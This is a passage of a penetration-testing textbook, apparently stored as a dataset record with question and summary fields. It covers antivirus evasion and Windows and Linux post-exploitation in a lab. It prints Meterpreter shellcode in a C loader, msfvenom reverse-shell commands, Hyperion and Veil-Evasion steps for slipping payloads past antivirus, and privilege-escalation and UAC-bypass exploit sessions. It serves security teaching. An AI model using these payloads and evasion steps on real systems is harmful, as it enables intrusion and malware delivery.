8\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\"\n\"\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\"\n\"\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\"\n\"\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\"\n\"\\x85\\xf6\\x75\\xec\\xc3\";\nint main(void)\n{\n((void (*)())shellcode)();\n}\nListing 12-7: Finished custom C file\nNow we need to compile the C program. We can’t use the built-in\nGCC program because it would compile our program to run on Linux\nsystems, and we want to run it on a 32-bit Windows system. Instead, we’ll\nuse the Mingw32 cross compiler from the Kali Linux repositories , which\nwe installed in Chapter 1. If you haven’t already installed it, install it with\napt-get install mingw32, and then compile your custom C file with i586-min-\ngw32msvc-gcc. (Other than the program name, the syntax for using the cross\ncompiler is the same as for Linux’s built-in GCC, discussed in Chapter 3.)\n268 Chapter 12\nroot@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c\nNow upload the resulting executable to VirusTotal. As of this writing,\n18 antivirus products detected the malicious file. That’s an improvement,\nbut Microsoft Security Essentials is still catching our file. We still need to work a little harder to get a malicious executable onto\nour Windows 7 system. (You could have better success with this technique\nwith another cross compiler from another repository.)\nEncrypting Executables with Hyperion\nAnother way to obfuscate our payload is to encrypt it. One executable\nencrypter is Hyperion, which uses Advanced Execution Standard (AES)\nencryption, a current industry standard. After encrypting the executable,\nHyperion throws away the encryption keys. When the executable runs,\nit brute-forces the encryption key to decrypt itself back to the original\nexecutable. If you have any background in cryptography, this process should raise\na lot of red flags. AES is currently considered a secure encryption standard. If the executable doesn’t have access to the encryption key, it should not\nbe able to brute-force the key in any reasonable amount of time, certainly\nnot fast enough for our program to run in the time window of our pentest. What’s going on? As it turns out, Hyperion greatly reduces the possible keyspace for the\nencryption key, which means that binaries encrypted with it shouldn’t be\nconsidered cryptographically secure. However, because our goal and the\ngoal of the Hyperion authors is to obfuscate the code to bypass antivirus\ndetection, the fact that the key can be brute-forced is not a problem. Let’s start by using Hyperion to encrypt at simple Meterpreter executable\nwith no additional antivirus avoidance techniques, as shown in Listing 12-8. (We installed Hyperion in Chapter 1 on page 21). root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe >\nmeterpreter.exe\nroot@kali:~# cd Hyperion-1.0/\nroot@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exeu\nOpening ../bypassav.exe\nCopied file to memory: 0x117178\n--snip--\nExecuting fasm.exe\nflat assembler version 1.69.31\n5 passes, 0.4 seconds, 92672 bytes. Listing 12-8: Running Hyperion\nBypassing Antivirus Applications 269\nHyperion was written to run on Windows systems, but we can run it\non Kali Linux with the Wine program, as you can see in Listing 12-8. Be\nsure to change into the Hyperion directory created when you unzipped the\nsource before running hyperion.exe with Wine. Hyperion takes two arguments: the name of the file to encrypt and\nthe name of the encrypted output file. Run Hyperion to encrypt the\nsimple Meterpreter executable as shown at u. The resulting file is in the\nHyperion 1.0 directory, so upload it to VirusTotal from there. Using just a Meterpreter executable generated with Msfvenom (with\nno encoding, custom templates, or anything else) and encrypting it with\nHyperion resulted in 27 antivirus programs in VirusTotal detecting the\nmalicious behavior. That’s not our lowest detection rate yet, but we have\nfinally achieved our goal. As shown in Figure 12-8, Microsoft Security\nEssentials did not detect any malicious activity! Figure 12-8: Microsoft Security Essentials does not detect malware. Sure enough, we can download and run the Hyperion-encrypted\nexecutable on the Windows 7 system with antivirus protection and get a\nMeterpreter session. We haven’t achieved a 0 percent detection rate—the\nholy grail for antivirus bypass researchers—but we have been able to meet\nour pentest goals. note To lower our detection rate even more, try combining Hyperion encryption with other\ntechniques from this section. For example, using Hyperion with a custom template\ndropped my detection number down to 14. Evading Antivirus with Veil-Evasion\nEven though we have successfully reached our goal of bypassing Microsoft\nSecurity Essentials on Windows 7, the antivirus landscape changes rapidly,\nso it is worthwhile to keep abreast of the latest tools and techniques. Veil-\nEvasion is a Python framework that automates creating antivirus-evading\npayloads, giving users the choice of multiple techniques. We covered install-\ning Veil-Evasion on Kali Linux in Chapter 1 on page 21; refer back if you\nneed a refresher. note As updates are made to Veil-Evasion, your version may be different from what is\nshown here. 270 Chapter 12\nPython Shellcode Injection with Windows aPIs\nPreviously we looked at using a custom C template to compile and execute\nshellcode. We can do something similar with Python’s Ctypes library, which\ngives us access to Windows API function calls and can create C-compatible\ndata types. We can use Ctypes to access the Windows API VirtualAlloc, which\ncreates a new executable memory region for the shellcode and locks the\nmemory region in physical memory, to avoid a page fault as shellcode is cop-\nied in and executed. RtlMoveMemory is used to copy the shellcode bytes into\nthe memory region created by VirtualAlloc. The CreateThread API creates a\nnew thread to run the shellcode, and finally, WaitForSingleObject waits until\nthe created thread is finished and our shellcode has finished running. These steps collectively are referred to as the VirtualAlloc injection\nmethod. This method, of course, would give us a Python script rather than\na Windows executable, but you can use multiple tools to convert a Python\nscript into a stand-alone executable. Creating Encrypted Python-Generated Executables with Veil-Evasion\nOne of the methods implemented in Veil-Evasion uses the Python injec-\ntion technique described earlier. To provide further antivirus protection,\nVeil-Evasion can use encryption. For our example, we will use Python\nVirtualAlloc injection combined with AES encryption, as we did in the\nHyperion example earlier in this chapter. To start Veil-Evasion, change directories to Veil-Evasion-master and run\n./Veil-Evasion.py.",
    "question": "What are the key techniques discussed in the text for bypassing antivirus applications when using Metasploit to create malicious payloads?",
    "summary": "The text explains how to use the Social-Engineer Toolkit (SET) to perform phishing attacks by sending malicious files via email or creating fake email templates. It also covers how to create a credential harvester attack using web-based methods. Additionally, it discusses techniques to bypass antivirus programs, including using Metasploit encoders like shikata_ga_nai and x86/bloxor, and custom cross-compiling with C templates and the Mingw32 compiler. Finally, it introduces Hyperion and Veil-Evasion as tools for encrypting payloads to evade detection."
  },
  {
    "start": 80,
    "end": 92,
    "text": "You should be presented with a menu-based prompt similar\nto those we saw in SET in the previous chapter, as shown in List ing 12-9. root@kali:~/Veil-Evasion-master# ./Veil-Evasion.py\n========================================================================\nVeil-Evasion | [Version]: 2.6.0\n========================================================================\n[Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework\n========================================================================\nMain Menu\n28 payloads loaded\nAvailable commands:\nuse use a specific payload\ninfo information on a specific payload\nlist list available payloads\nupdate update Veil to the latest version\nclean clean out payload folders\ncheckvt check payload hashes vs. VirusTotal\nexit exit Veil\nListing 12-9: Running Veil\nBypassing Antivirus Applications 271\nTo see all the available payloads in Veil-Evasion, enter list at the\nprompt, as shown in Listing 12-10. [>] Please enter a command: list\nAvailable payloads:\n1) auxiliary/coldwar_wrapper\n2) auxiliary/pyinstaller_wrapper\n--snip--\n22) python/meterpreter/rev_tcp\nu23) python/shellcode_inject/aes_encrypt\n24) python/shellcode_inject/arc_encrypt\n25) python/shellcode_inject/base64_substitution\n26) python/shellcode_inject/des_encrypt\n27) python/shellcode_inject/flat\n28) python/shellcode_inject/letter_substitution\nListing 12-10: Veil-Evasion payloads\nAs of this writing, there are 28 ways to create executables implemented in\nVeil-Evasion. For this example, choose option 23 u to use the VirtualAlloc\ninjection method and encrypt it with AES encryption. Once you choose a\nmethod, Veil-Evasion will prompt you to change the method options from the\ndefault, if desired, as shown in Listing 12-11. [>] Please enter a command: 23\nPayload: python/shellcode_inject/aes_encrypt loaded\nRequired Options:\nName Current Value Description\n---- ------------- -----------\nucompile_to_exe Y Compile to an executable\nexpire_paylo X Optional: Payloads expire after \"X\" days\nvinject_method Virtual Virtual, Void, Heap\nuse_pyherion N Use the pyherion encrypter\nAvailable commands:\nset set a specific option value\ninfo show information about the payload\ngenerate generate payload\nback go to the main menu\nexit exit Veil\nListing 12-11: Using Python VirtualAlloc in Veil-Evasion\n272 Chapter 12\nBy default, this payload will compile the Python script into an execut-\nable u using VirtualAlloc() as the injection method v. These options are\ncorrect for our example, so enter generate at the prompt. You are then\nprompted for details about the shellcode, as shown in Listing 12-12. [?] Use msfvenom or supply custom shellcode? 1 - msfvenom (default)\n2 - Custom\n[>] Please enter the number of your choice: 1\n[*] Press [enter] for windows/meterpreter/reverse_tcp\n[*] Press [tab] to list available payloads\n[>] Please enter metasploit payload:\n[>] Enter value for 'LHOST', [tab] for local IP: 192.168.20.9\n[>] Enter value for 'LPORT': 2345\n[>] Enter extra msfvenom options in OPTION=value syntax:\n[*] Generating shellcode... [*] Press [enter] for 'payload'\n[>] Please enter the base name for output files: meterpreterveil\n[?] How would you like to create your payload executable? 1 - Pyinstaller (default)\n2 - Py2Exe\n[>] Please enter the number of your choice: 1\n--snip--\n[*] Executable written to: /root/veil-output/compiled/meterpreterveil.exe\nLanguage: python\nPayload: AESEncrypted\nShellcode: windows/meterpreter/reverse_tcp\nOptions: LHOST=192.168.20.9 LPORT=2345\nRequired Options: compile_to_exe=Y inject_method=virtual use_pyherion=N\nPayload File: /root/veil-output/source/meterpreterveil.py\nHandler File: /root/veil-output/handlers/meterpreterveil_handler.rc\n[*] Your payload files have been generated, don't get caught! [!] And don't submit samples to any online scanner! ;)\nListing 12-12: Generating the executable in Veil-Evasion\nVeil-Evasion prompts you to select either Msfvenom to generate\nthe shellcode or to provide custom shellcode. For our purposes, choose\nMsfvenom. The default payload is windows/meterpreter/reverse_tcp, so press\nenter to select it. You should be prompted for the usual options, LHOST and\nBypassing Antivirus Applications 273\nLPORT, and for a filename for the generated executable. Finally, Veil-Evasion\noffers two Python to executable methods. Choose the default, Pyinstaller,\nto have Veil-Evasion generate the malicious executable and save it to the\nveil-output/compiled directory. As of this writing, the resulting executable sails right past Microsoft\nSecurity Essentials on our Windows 7 box. Veil-Evasion notes that you\nshouldn’t upload the resulting executable to online scanners, so at the\nauthor’s request we’ll forgo checking this example with VirusTotal. However, we can install other antivirus solutions besides Microsoft\nSecurity Essentials to see if the executable is flagged. note If you find the Veil-Evasion executables aren’t working, you might need to update\nMetasploit with Msfupdate. Since Veil-Evasion is not currently in the Kali Linux\nrepos, the latest version you pull down when you set up may not match up with how\nMsfvenom works in the default Kali 1.0.6 install. Of course, if you update Metasploit\nwith Msfupdate, other exercises in this book may change, as Metasploit’s functional-\nity changes frequently. Therefore, you may want to save this exercise for a second pass\nthrough the book or use a second Kali Linux image if you don’t want the update to\naffect later exercises in the book. hiding in Plain sight\nPerhaps the best way to avoid antivirus programs is to avoid traditional pay-\nloads altogether. If you are familiar with coding for Windows, you can use\nWindows APIs to mimic the functionality of a payload. There is, of course, no\nrule that legitimate applications cannot open a TCP connection to another\nsystem and send data—essentially what our windows/meterpreter/reverse_tcp\npayload is doing. You may find that instead of generating the payload with Msfvenom and\nattempting to hide it with the methods covered in this chapter, you get even\nbetter results just writing a C program that performs the payload function-\nality you want. You can even invest in a code-signing certificate to sign your\nbinary executable, to make it look even more legitimate. note Turn Real-time protection in Microsoft Security Essentials back off before moving on\nto post exploitation. summary\nWe’ve looked at only a few techniques for bypassing antivirus detection in\nthis chapter. The topic of bypassing antivirus solutions could take up an\nentire book, and by the time it was published, the book would already be\nwildly out of date. Pentesters and researchers are constantly coming up with\nnew techniques to sneak past antivirus detection, and antivirus vendors are\nalways adding new signatures and heuristics to catch them. 274 Chapter 12\nWe looked at ways to use Metasploit to encode and embed payloads\nin legitimate executables. When we found that these techniques weren’t\nenough to evade Microsoft Security Essentials, we turned to techniques\nbeyond Metasploit. We built a custom executable template and found that\nwe were able to improve our results by combining techniques. We were finally able to reach our goal of bypassing Microsoft Security\nEssentials using Hyperion. Though we never reached a 0 percent detection\nrate, we were able to bypass Microsoft Security Essentials as well as several\nother top antivirus solutions. We also looked at another tool, Veil-Evasion,\nwhich uses VirtualAlloc injection combined with encryption for even better\nevasion. Having looked at a lot of ways to get onto systems, even ones without\nreadily apparent vulnerabilities, we’ll now turn our attention to what we can\ndo once we penetrate a system, as we enter the post-exploitation stage of\npentesting. Bypassing Antivirus Applications 275\n13\nPost e xPloitation\nWe’ve gained access to our target systems, so our pen-\netration test is over, right? We can tell our client that\nwe got a shell on their systems. But so what? Why would the client care? In the post-exploitation phase, we will look at information gathering\non the exploited systems, privilege escalation, and moving from system to\nsystem. Perhaps we’ll find that we can access sensitive data stored on the\nexploited system or that we have network access to additional systems that\nwe can use to gain further access to company data. Maybe the exploited\nsystem is part of a domain, and we can use it to access other systems on the\ndomain. These are just a few of the potential avenues open to us in post\nexploitation. Post exploitation is arguably the most important way to get a clear pic-\nture of a client’s security posture. For example, in Chapter 9, I mentioned a\npentest in which I used access to a decommissioned Windows 2000 domain\ncontroller to gain complete administrative control over a domain. If I hadn’t\nused post-exploitation techniques, I might have instead concluded that the\nWindows 2000 system stored no sensitive information and that it wasn’t\nconnected to other systems in a domain. My pentest would not have been\nnearly as successful, and my client wouldn’t have gotten as good of a picture\nof their vulnerabilities, especially when it came to password policies. This chapter will cover the basics of post exploitation. As you move\nbeyond this book and increase your skills as a pentester, you should spend\na good deal of time on post exploitation. Solid post-exploitation skills dif-\nferentiate good pentesters from the truly great. Now let’s look at some of our post-exploitation options in Metasploit. meterpreter\nWe discussed Meterpreter, Metasploit’s custom payload, in Chapter 8. Now\nlet’s dig deeper and look at some of Meterpreter’s functionality. We’ll begin post exploitation by opening a Meterpreter session on each\nof our target systems. As you can see in Listing 13-1, I have a session on the\nWindows XP target from the MS08-067 exploit. On the Windows 7 target,\nI used a trojan executable like those we used in the previous chapter. On\nthe Linux target, I used the TikiWiki PHP vulnerability we exploited in\nChapter 8. You can also log in to the Linux target via SSH using either the\npassword for georgia we cracked in Chapter 9 (password) or the SSH public\nkey we added in Chapter 8 using the open NFS share. msf > sessions -l\nActive sessions\n===============\nId Type Information Connection\n-- ---- ----------- ----------\n1 meterpreter x86/win32 NT AUTHORITY\\SYSTEM @ BOOKXP 192.168.20.9:4444 ->\n\n192.168.20.10:1104\n(192.168.20.10)\n2 meterpreter x86/win32 Book-Win7\\Georgia Weidman @ Book-Win7 192.168.20.9:2345 ->\n\n192.168.20.12:49264\n(192.168.20.12)\n3 meterpreter php/php www-data (33) @ ubuntu 192.168.20.9:4444 ->\n\n192.168.20.11:48308\n(192.168.20.11)\nListing 13-1: Open Metasploit sessions on our targets\nStart by interacting with your Windows XP session as shown here.\nmsf post(enum_logged_on_users) > sessions -i 1\nWe’ve already seen a couple of Meterpreter commands throughout the\nbook. Namely, in Chapter 9, we used hashdump to get direct access to local\npassword hashes in on “Offline Password Attacks” on page 203. To see a\nlist of available Meterpreter commands, enter help in the Meterpreter con-\nsole. For more details about a specific command, enter command -h.\n278 Chapter 13\nUsing the upload Command\nPerhaps nothing is quite so annoying on a pentest as finding yourself on a\nWindows machine without access to utilities such as wget and curl to pull\ndown files from a web server. In Chapter 8, we saw a way to bypass this\nproblem with TFTP, but Meterpreter easily solves the problem for us. With\na simple command, help upload, we can upload files to the target, as shown\nin Listing 13-2.\nmeterpreter > help upload\nUsage: upload [options] src1 src2 src3 ... destination\nUploads local files and directories to the remote machine.\n\nOPTIONS:\n-h Help banner.\n-r Upload recursively.\nListing 13-2: Meterpreter help command\nThis help information tells us that we can use upload to copy files from\nour Kali system to the Windows XP target.\nFor example, here’s how to upload Netcat for Windows:\nmeterpreter > upload /usr/share/windows-binaries/nc.exe C:\\\\\n[*] uploading : /usr/share/windows-binaries/nc.exe -> C:\\\n[*] uploaded : /usr/share/windows-binaries/nc.exe -> C:\\\\nc.exe\nnote Remember to escape the backslash characters in the path with a second backslash. Also\nremember that if you upload anything to a target during a pentest or otherwise change\nthe target system, record your changes so you can undo them before the engagement\nis over. The last thing you want to do is leave an environment more vulnerable than\nwhen you found it.\ngetuid\nAnother useful Meterpreter command is getuid. This command will tell you\nthe name of the System user running Meterpreter. Typically, Meterpreter runs\nwith the privileges of the exploited process or user.\nFor example, when we exploit an SMB server with the MS08-067 exploit,\nwe’re running on the target with the privileges of the SMB server, namely\nthe Windows System account, as shown here.\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nOn the Windows 7 target, we social-engineered the user into running a\ntrojaned program that connected back to Metasploit, so Meterpreter is run-\nning as the user Georgia Weidman.\nPost Exploitation 279\nOther Meterpreter Commands\nBefore moving on, take some time to work with additional Meterpreter\ncommands. You’ll find many useful commands for local information gath-\nering, remote control, and even spying on local users, such as keylogging\nand turning on a webcam from a Meterpreter session.\nmeterpreter scripts\nIn addition to Meterpreter commands, you can also run Meterpreter scripts\nfrom a Meterpreter console. The scripts currently available can be found\nin Kali at /usr/share/metasploit-framework/scripts/meterpreter. These scripts are\nwritten in Ruby, and you can write your own and submit them for inclusion\nin the framework. To use a Meterpreter script, enter run <script name>. Use\nthe -h flag to see help information for a script.\nWhen exploiting Internet Explorer in Chapter 10, we used the\nAutoRunScript option to automatically run the migrate script to spawn a new\nprocess and migrate into it before the browser crashed. We can run this script\ndirectly inside Meterpreter as well. For example, entering run migrate -h, as\nshown in Listing 13-3, gives us information on the migrate Meterpreter\nscript.\nmeterpreter > run migrate -h\n\nOPTIONS:\n-f Launch a process and migrate into the new process\n-h Help menu.\n-k Kill original process.\n-n <opt> Migrate into the first process with this executable name\n(explorer.exe)\n-p <opt> PID to migrate to.\nListing 13-3: Migrate script help information\nBecause we’re not racing to beat a session before it closes, we have a\nfew different options for which process to migrate to. We can migrate to a\nprocess by name using the -n option. For example, to migrate to the first\ninstance of explorer.exe that Meterpreter encounters in the process list, we\ncan use -n explorer.exe.\nYou can also migrate to a process by using its process ID (PID) with the\n-p option. Use Meterpreter’s ps command to see a list of running processes,\nas shown in Listing 13-4.\n280 Chapter 13\nmeterpreter > ps\nProcess List\n============\nPID PPID Name Arch Session User Path\n--- ---- ---- ---- ------- ---- ----\n0 0 [System Process] 4294967295\n4 0 System x86 0 NT AUTHORITY\\SYSTEM\n--snip--\n1144 1712 explorer.exe x86 0 BOOKXP\\georgia C:\\WINDOWS\\Explorer.EXE\n--snip--\n1204 1100 wscntfy.exe x86 0 BOOKXP\\georgia\nListing 13-4: Running process list\nExplorer.exe is a solid choice. Choose PID 1144 for explorer.exe, and run the\nMeterpreter migrate script as shown in Listing 13-5.\nmeterpreter > run migrate -p 1144\n[*] Migrating from 1100 to 1144...\n[*] Migration completed successfully.\nmeterpreter > getuid\nServer username: BOOKXP\\georgia\nListing 13-5: Running the migrate script\nMeterpreter successfully migrates into the explorer.exe process. Now if\nthe SMB server happens to become unstable or die, our Meterpreter session\nis safe.\nIf you ran the getuid command again, you would see that we are no lon-\nger running as the System user but as user georgia. This makes sense because\nthis process belongs to the logged-in user georgia. By moving into this pro-\ncess, we’ve effectively dropped our privileges down to user georgia.\nLet’s stay logged in as user georgia on the XP target and look at some\nways to elevate our privileges to System on Windows targets and root on the\nLinux target through local privilege-escalation attacks.\nmetasploit Post-exploitation modules\nSo far we’ve used Metasploit modules for information gathering, vulnerabil-\nity identification, and exploitation. It should come as no surprise that the\nframework has a plethora of useful modules for the post-exploitation phase\nas well. Metasploit’s post directory contains modules for local information\ngathering, remote control, privilege escalation, and so on, which span mul-\ntiple platforms.\nPost Exploitation 281\nFor example, consider the module post/windows/gather/enum_logged_\non_users. As shown in Listing 13-6, this module will show us which users\nare currently logged on to the target system. Put your session in the back-\nground (with ctrl-Z or background) to return to the main Msfconsole\nprompt.\nmsf > use post/windows/gather/enum_logged_on_users\nmsf post(enum_logged_on_users) > show options\nModule options (post/windows/gather/enum_logged_on_users):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCURRENT true yes Enumerate currently logged on users\nRECENT true yes Enumerate Recently logged on users\nuSESSION yes The session to run this module on.\nmsf post(enum_logged_on_users) > set SESSION 1\nSESSION => 1\nmsf post(enum_logged_on_users) > exploit\n[*] Running against session 1\nCurrent Logged Users\n====================\nSID User\n--- ----\nS-1-5-21-299502267-308236825-682003330-1003 BOOKXP\\georgia\n[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ\n_791806.txt v\nRecently Logged Users\n=====================\nSID Profile Path\n--- ------------\nS-1-5-18 %systemroot%\\system32\\config\\systemprofile\nS-1-5-19 %SystemDrive%\\Documents and Settings\\LocalService\nS-1-5-20 %SystemDrive%\\Documents and Settings\\NetworkService\nS-1-5-21-299502267-308236825-682003330-1003 %SystemDrive%\\Documents and Settings\\georgia\nListing 13-6: Running a Metasploit post module\nWe use post modules as we do all Metasploit modules: We set the rel-\nevant options, and then enter exploit to run the module. However, in the\ncase of post-exploitation modules, instead of setting an RHOST or SRVHOST, we\nneed to tell Metasploit the Session ID we want to run the post-exploitation\nmodule against u. We then run the module against Session 1, the Windows\nXP target.\n282 Chapter 13\nThe module returns data telling us the user georgia is currently\nlogged in. Metasploit automatically saves the output to a file /root/ .msf4/\nloot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt v.\nrailgun\nRailgun is an extension for Meterpreter that allows direct access to Windows\nAPIs. It can be used inside post-exploitation modules for Meterpreter as well\nas the Ruby shell (irb) in a Meterpreter session. For example, we can check\nif the session is running as an administrative user by directly accessing the\nIsUserAnAdmin function of the shell32 Windows DLL, as shown here. Be sure to\nbring a session to the foreground with sessions -i <session id> first.\nmeterpreter > irb\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>> client.railgun.shell32.IsUserAnAdmin\n=> {\"GetLastError\"=>0, \"Error Message\"=>\"The operation completed successfully.\", \"return\"=>true}\nFirst, we drop into a Ruby shell with the command irb. Note that the\nclient variable holds the Meterpreter client. Next we enter client.railgun\n.shell32.IsUserAnAdmin to tell the Ruby interpreter to use Railgun on the cur-\nrent Meterpreter session and access the IsUserAdmin function of shell32.dll. (For\nadditional Railgun examples, check out Metasploit post modules such as\nwindows/gather/reverse_lookup.rb and windows/manage/download_exec.rb, which\nalso leverage this functionality.) Enter exit to drop out of the Ruby interpreter\nand return to Meterpreter.\nLocal Privilege escalation\nIn the following sections, we’ll explore examples of local privilege escalation,\nwhich involves running exploits to gain additional control of the system\nafter exploitation.\nJust like network software and client-side software, privileged local\nprocesses can be subject to exploitable security issues. Some of your attacks\nmay not result in gaining the privileges you would like. Gaining command\nexecution through a website, compromising a user account without admin-\nistrative rights, or exploiting a listening service with limited privileges can\nall lead to system access, but you may find yourself still working as a limited\nuser. To get the privileges we want, we will need to exploit further issues.\ngetsystem on Windows\nMeterpreter’s getsystem command automates trying a series of known local\nprivilege-escalation exploits against the target. The command’s options are\nshown in Listing 13-7.\nPost Exploitation 283\nmeterpreter > getsystem -h\nUsage: getsystem [options]\nAttempt to elevate your privilege to that of local system.\n\nOPTIONS:\n-h Help Banner.\n-t <opt> The technique to use. (Default to '0').\n0 : All techniques available\n1 : Service - Named Pipe Impersonation (In Memory/Admin)\n2 : Service - Named Pipe Impersonation (Dropper/Admin)\n3 : Service - Token Duplication (In Memory/Admin)\nListing 13-7: getsystem help\nAs shown here, running getsystem with no arguments will run a series\nof local exploits until one succeeds or all known exploits are exhausted. To\nrun a particular exploit, use the -t option followed by the exploit number.\nHere we run getsystem on our Windows XP target with no arguments.\nmeterpreter > getsystem\n...got system (via technique 1).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nAs you can see, Meterpreter gained system privileges with the first\nexploit it tried. With one command, we are able to elevate our privileges\nfrom georgia to System.\nLocal Escalation Module for Windows\nLocal exploit modules in Metasploit allow you to run an exploit on an\nopen session to gain additional access. The local privilege-escalation\nmodule exploit/windows/local/ms11_080_afdjoinleaf in Listing 13-8 exploits\na (now-patched) flaw in the Afdjoinleaf function of the afd.sys Windows\ndriver. Like post-exploitation modules, use the SESSION option to denote\nwhich open session the exploit should be run against. We’ll run the module\nagainst our Windows XP session. Unlike post modules, local exploits are\nexploits, so we’ll need to set a payload. If it succeeds, our exploit will open a\nnew session with System privileges. In your Windows XP Meterpreter ses-\nsion, run the command rev2self to drop back down to the user georgia\nbefore using this alternative privilege-escalation technique.\nmsf post(enum_logged_on_users) > use exploit/windows/local/ms11_080_afdjoinleaf\nmsf exploit(ms11_080_afdjoinleaf) > show options\nModule options (exploit/windows/local/ms11_080_afdjoinleaf):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module on.\n284 Chapter 13\n--snip--\nmsf exploit(ms11_080_afdjoinleaf) > set SESSION 1\nSESSION => 1\nmsf exploit(ms11_080_afdjoinleaf) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms11_080_afdjoinleaf) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms11_080_afdjoinleaf) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Running against Windows XP SP2 / SP3\n--snip--\n[*] Writing 290 bytes at address 0x00f70000\n[*] Sending stage (751104 bytes) to 192.168.20.10\n[*] Restoring the original token...\n[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1108) at\n2015-08-14 01:59:46 -0400\nmeterpreter >\nListing 13-8: Metasploit local exploit\nAfter you enter exploit, Metasploit runs the exploit in our Windows XP\nsession. If it succeeds, you should receive another Meterpreter session. If\nyou run getuid on this new session, you should see that you’ve once again\nobtained System privileges.\nnote Remember, to succeed, local privilege-escalation attacks rely on a flaw such as a\nmissing patch or security misconfiguration. A fully updated and locked-down system\nwould not be vulnerable to the MS11-08 exploit because a vendor patch was released\nin 2011.\nBypassing UAC on Windows\nNow let’s see how to escalate our privileges on our more secure Windows 7\ntarget, which has additional security features including user account control\n(UAC). Applications running on Windows Vista and higher are limited to\nusing regular user privileges. If an application needs to use administra-\ntive privileges, an administrative user has to approve the elevation. (You’ve\nprobably seen the warning notice from UAC when an application wants to\nmake changes.)\nBecause we gained this session by having user Georgia Weidman run\na malicious binary, the Meterpreter session currently has the privileges\nof Georgia Weidman. Try using getsystem against this target, as shown in\nListing 13-9.\nmsf exploit(ms11_080_afdjoinleaf) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getuid\nPost Exploitation 285\nServer username: Book-Win7\\Georgia Weidman\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied.\nListing 13-9: getsystem fails on Windows 7\nAs you can see, running getsystem against this target fails and gives an\nerror message. Perhaps this system is fully patched and hardened to the\npoint where none of the exploitation techniques in getsystem will work.\nBut as it turns out, our Windows 7 target has not been patched since\ninstallation; UAC is stopping getsystem from working properly.\nAs with any computer security control, researchers have developed mul-\ntiple techniques to bypass the UAC control. One such technique is included\nin Metasploit in the local exploit windows/local/bypassuac. Background\nthe session and run this exploit on your Windows 7 session, as shown in\nListing 13-10. Use the exploit module, set the SESSION option, and so on.\nmsf exploit(ms11_080_afdjoinleaf) > use exploit/windows/local/bypassuac\nmsf exploit(bypassuac) > show options\nModule options (exploit/windows/local/bypassuac):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSESSION yes The session to run this module\nmsf exploit(bypassuac) > set SESSION 2\nSESSION => 2\nmsf exploit(bypassuac) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] UAC is Enabled, checking level...\n--snip--\n[*] Uploaded the agent to the filesystem....\n[*] Sending stage (751104 bytes) to 192.168.20.12\n[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.12:49265) at\n2015-08-14 02:17:05 -0400\n[-] Exploit failed: Rex::TimeoutError Operation timed out. u\nmeterpreter > getuid\nServer username: Book-Win7\\Georgia Weidman\nListing 13-10: Using a module to bypass the UAC control\nThe module uses a trusted publisher certificate through process injec-\ntion to bypass the UAC controls. As you can see from the results of the\ngetuid command, though our new session is still running as user Georgia\nWeidman, we’re no longer restricted by UAC. If it was successful you will\nagain be presented with a new session. Don’t worry if you see the line at u.\nAs long as the new Meterpreter session opens, the attack was successful.\nAs shown next, having gotten UAC out of the way, getsystem has no\ntrouble gaining system privileges.\n286 Chapter 13\nmeterpreter > getsystem\n...got system (via technique 1).\nUdev Privilege Escalation on Linux\nWe have yet to try privilege escalation on our Linux target. Let’s mix things\nup a bit and use public exploit code instead of Metasploit to perform a local\nprivilege-escalation attack on Linux.\nWe have two ways to interact with our Linux target: via SSH and by\nusing the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has\nfewer available commands than Windows Meterpreter, but in both cases we\nuse the shell command to drop out of Meterpreter and into a regular com-\nmand shell, as shown in Listing 13-11.\nmeterpreter > shell\nProcess 13857 created.\nChannel 0 created.\nwhoami\nwww-data\nListing 13-11: Dropping to a shell in Meterpreter\nWe see that our TikiWiki exploit gained us a session as the user\nwww-data, a limited account for the web server, but we have a long way to\nget to root. We have also gained a Bash shell as the user georgia through\nSSH in Chapter 8 with more privileges than www-data, but we’re still not\nthe coveted root.\nFinding a Vulnerability\nWe need to find a local privilege-escalation vulnerability to exploit. First, we\nneed a bit of information about the local system, such as the version of the\ninstalled kernel and the Ubuntu version. You can find out the Linux kernel\nversion with the command uname -a and the Ubuntu release version with the\ncommand lsb_release -a, as shown in Listing 13-12.\nuname -a\nLinux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux\nlsb_release -a\nDistributor ID: Ubuntu\nDescription: Ubuntu 8.10\nRelease: 8.10\nCodename: intrepid\nListing 13-12: Gathering local information\nThe Linux target is running Linux kernel 2.6.27-2 and Ubuntu 8.10,\ncodename Intrepid. This Linux system is a bit out of date and is vulnerable\nPost Exploitation 287\nto multiple known privilege-escalation issues. We’ll focus on an issue in\nudev, the device manager for the Linux kernel that is in charge of loading\ndevice drivers, or software that facilitates control of a device.\nVulnerability CVE-2009-1185 describes an issue in udev where the\ndaemon, which runs with root privileges, fails to check whether requests to\nload drivers 